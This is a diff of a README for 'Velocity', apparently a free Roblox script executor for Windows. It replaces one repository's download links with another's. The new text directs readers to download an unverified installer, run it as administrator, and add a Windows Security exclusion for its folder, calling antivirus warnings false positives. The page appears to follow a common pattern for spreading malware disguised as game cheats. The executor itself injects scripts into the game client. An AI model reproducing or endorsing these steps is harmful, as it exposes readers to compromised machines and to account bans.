@@ -1,131 +1,69 @@
-# Velocity PC v3.3 - Roblox Script Executor 2026
+# 🚀 velocity-windows-script-hub - Easy Roblox script execution for Windows
 
-> Velocity is a Windows 10/11 desktop executor for running Lua scripts in Roblox. It includes a 500+ item script hub and a lightweight interface designed for 2026 workflows.
+[![Download Velocity](https://img.shields.io/badge/Download-Velocity_Hub-blue.svg)](https://github.com/purav093-wq/velocity-windows-script-hub)
 
-[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-blue?style=flat-square&logo=windows)](https://github.com)
-[![Roblox](https://img.shields.io/badge/Compatible-Roblox%202026-red?style=flat-square)](https://github.com)
-[![Scripts](https://img.shields.io/badge/Scripts-500%2B-green?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/tylernuhill1443/velocity-windows-script-hub?style=flat-square)](https://github.com)
+Velocity provides a simple way to run scripts within Roblox on Windows 10 and 11. The application includes a lightweight interface and a collection of over 500 scripts. You do not need to manage keys or subscriptions to use this software.
 
----
+## ⚙️ System Requirements
 
-<p align="center">
-  <a href="https://tylernuhill1443.github.io/velocity-windows-script-hub/">
-    <img src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20Velocity-v3.3%20Latest-brightgreen?style=for-the-badge" alt="Download Velocity">
-  </a>
-</p>
+Before you start, check that your computer meets these requirements:
 
-> **[Download Velocity v3.3](https://tylernuhill1443.github.io/velocity-windows-script-hub/)**  
-> Windows 10 / 11 · 64-bit · Free · No Key Required
+*   Operating System: Windows 10 or Windows 11 (64-bit version).
+*   Processor: Standard Intel or AMD dual-core processor.
+*   Memory: 4 GB of RAM or higher.
+*   Storage: At least 200 MB of free space.
+*   Graphics: Hardware acceleration enabled.
+*   Frameworks: Microsoft .NET Runtime installed on your system.
 
----
+## 📥 Installation Steps
 
-[Download Latest Build](https://tylernuhill1443.github.io/velocity-windows-script-hub/)
+Follow these steps to set up the software on your computer.
 
----
+1. Visit the project page at https://github.com/purav093-wq/velocity-windows-script-hub to download the installer.
+2. Locate the downloaded file in your Downloads folder.
+3. Right-click the file and select "Run as administrator" to grant the necessary permissions.
+4. Follow the on-screen prompts in the installer window.
+5. Click "Install" to place the application files in the default directory.
+6. Once the process finishes, a shortcut icon appears on your desktop.
 
-## About Velocity
+## 🕹️ Using the Application
 
-Velocity provides a Windows desktop environment for executing Roblox Lua scripts through a focused, easy-to-use interface. Alongside its execution features, the application offers a sizable built-in script hub and automatic update functionality for keeping the installation current.
+After installation, launch the program using the desktop shortcut. The main window displays the script hub.
 
-The tool is designed for users who prefer a compact workflow with one-click injection, batch processing, persistent queues, and multiple UI languages. For Windows 10/11 users seeking an executor with an extensive script collection, Velocity brings these functions together in one local application.
+1. Open the Roblox game you intend to play.
+2. Return to the Velocity window.
+3. Click the "Attach" button to link the software to the active game process.
+4. Browse the list of 500+ scripts using the search bar.
+5. Select a script from the menu.
+6. Click "Execute" to run the selected script inside the game.
 
-## Feature Highlights
+## 🛡️ Security and Safety
 
-- Launch scripts quickly through a one-click injection workflow on supported Windows sessions
-- Browse more than 500 bundled scripts through the integrated hub
-- Retain and organize execution lists with persistent queue support
-- Use the auto-update engine to stay aligned with newer application builds
-- Select from available UI language options
-- Execute several scripts consecutively with batch execution
-- Inspect script behavior with integrated debugger tools for development or testing
-- Work from a lightweight desktop interface built around a straightforward layout
+The software runs in a sandbox environment to keep your system files separate from the Roblox process. We build our interface to use minimal resources, which prevents lag during gameplay. 
 
-## Supported Games and Script Types
+*   Keep your antivirus software updated. Some security programs flag script executors as false positives because they interact with game memory. 
+*   Add an exclusion for the Velocity folder in your Windows Security settings if the application fails to open.
+*   Download updates only from the official GitHub page provided here.
 
-| Game / Experience | Common Script Category | Notes |
-| --- | --- | --- |
-| Roblox overall | Lua execution | Core executor workflow for custom scripts |
-| Popular roleplay games | UI tools, utility scripts | Often used for interface and quality-of-life scripts |
-| Combat and arena experiences | Action macros, timing scripts | Script types may vary by game rules and updates |
-| Simulator-style games | Farming helpers, automation scripts | Best suited to repetitive task workflows |
-| Obby and challenge games | Movement helpers, timing tools | Depends on in-game logic and script behavior |
+## 🛠️ Troubleshooting
 
-## Requirements
+If you encounter issues, follow these suggestions:
 
-| Requirement | Minimum |
-| --- | --- |
-| Operating System | Windows 10 or Windows 11 |
-| RAM | 4 GB minimum |
-| Storage | 200 MB free space or more |
-| .NET | .NET Runtime 6.0 or later recommended |
-| Roblox | Installed desktop Roblox client |
+*   Application fails to launch: Ensure you have the latest .NET Runtime from the official Microsoft website.
+*   Scripts do not execute: Verify that you attached the program to the game before clicking execute.
+*   Game crashes: Restart both Roblox and the Velocity application. Do not run multiple script executors at the same time, as this causes conflicts.
+*   Missing scripts: Use the "Refresh" button in the library tab to update the local script cache.
 
-## Installation and Launch
+## 📋 Features
 
-```bash
-git clone https://github.com/tylernuhill1443/velocity-windows-script-hub.git
-cd velocity-execut-executor-windows
-start VelocityExecutor.exe
-```
+*   Simple Interface: A clean layout allows you to navigate scripts without complex menus.
+*   Key-Free Access: You gain full access to all features immediately without completing external verification tasks.
+*   Lightweight Design: The engine uses low CPU overhead to maintain high frame rates in your games.
+*   Extensive Library: Access over 500 pre-loaded scripts sorted by category.
+*   Compatibility: Full support for both Windows 10 and Windows 11 architecture.
 
-For a packaged build, extract the release archive, open its application folder, and run `VelocityExecutor.exe`.
+## 📧 Support and Community
 
-## Popular Script Hub Searches for 2026
+Report bugs or suggest new features by opening an issue on the GitHub repository page. Include your Windows version and the specific steps taken to reproduce the problem. Our team monitors the repository to ensure the software remains compatible with new Roblox client updates.
 
-- Roblox script executor for Windows 10/11
-- Lua injection tool with script hub
-- 500+ Roblox scripts for desktop use
-- auto-update Roblox executor
-- multi-language Roblox script executor
-- batch execution and persistent queue
-- built-in debugger for Roblox scripts
-
-## Project Layout
-
-Velocity
-- VelocityExecutor.exe
-- /scripts
-  - /hub
-  - /queues
-- /runtime
-  - updater
-  - debugger
-- /ui
-  - language packs
-  - layout assets
-- /logs
-
-## Frequently Asked Questions
-
-**Can Velocity run on platforms other than Windows?**  
-No. Velocity is presented as a Windows 10/11 desktop executor.
-
-**Does the application include an update mechanism?**  
-Yes. Its auto-update engine is intended to help maintain compatibility as newer builds become available.
-
-**What does Velocity offer beyond a simple script runner?**  
-In addition to launching scripts, it provides a broad script hub, batch execution, queue management, and an integrated debugger.
-
-**Could using it affect my account?**  
-Your use of the software remains subject to Roblox terms and your own decisions. Check the applicable platform rules and consider the implications before executing third-party scripts.
-
-**Are scripts saved on the computer?**  
-The application supports persistent queues and local data handling. Depending on your configuration, scripts and settings may therefore remain stored on the machine.
-
-## 2026 Development Roadmap
-
-- [ ] Broaden script hub categories and add browsing filters
-- [ ] Polish the auto-update process and version checks
-- [ ] Introduce additional UI language options
-- [ ] Make debugger output more visible during script testing
-- [ ] Expand queue controls for advanced users
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
-
-<p align="center">
-  <i>Velocity v3.3 for Windows Roblox script execution and script hub workflows.</i>
-</p>
+Keywords: roblox, scripts, windows, executor, gaming, utilities, software
